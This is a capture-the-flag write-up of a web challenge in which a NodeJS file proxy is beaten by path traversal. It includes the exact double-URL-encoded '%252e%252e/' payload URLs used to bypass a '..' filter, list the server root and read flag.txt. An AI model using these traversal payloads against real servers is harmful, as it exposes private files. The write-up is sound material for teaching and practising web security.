### Points
100

### Readme
```
I wrote a little proxy program in NodeJS for my poems folder.

Everyone wants to read flag.txt but I like it too much to share.

http://web.chal.csaw.io:7311/?path=orange.txt
```

### Steps
1. We clicked to the provided link. It show us the content of a normal plain text file.
```
i love oranges
```

2. We can realize that this might be a kind of `Path traversal` attack. So, let's try some possible ways:

* Firstly, we try to see if the `..` is being blocked:

<http://web.chal.csaw.io:7311/?path=../orange.txt>

Resulted in:
```
WHOA THATS BANNED!!!!
```

So, we know that it filters out and block: `..` characters.

* Secondly, we try with the unicode format of the character `.` as `%25e`:

<http://web.chal.csaw.io:7311/?path=%25e%25e/orange.txt>

Resulted in:
```
Error response

Error code 404.

Message: File not found.

Error code explanation: 404 = Nothing matches the given URI. 
```

Wow, the printed result is different from the previous try. So, we know that the `%25e` character has not been filtered out.
Now, it is just the matter of `File not found`.

3. Next, we know that if we put so many `../` or `%25e%25e/`, we possibly able to traverse to the root of file system, eventually.
So, let's try it with:

<http://web.chal.csaw.io:7311/?path=%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/>

Oh! We can see some interesting files here:
```
Directory listing for /poems/../../../../../../../

    .dockerignore
    back.py
    flag.txt
    poems/
    serve.sh
    server.js 
```

4. The `flag.txt` is the file we need. Let's read it:

<http://web.chal.csaw.io:7311/?path=%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/flag.txt>

=> Flag: `flag{thank_you_based_orange_for_this_ctf_challenge}`


(Ref: WAH, chapter 10, page 375)
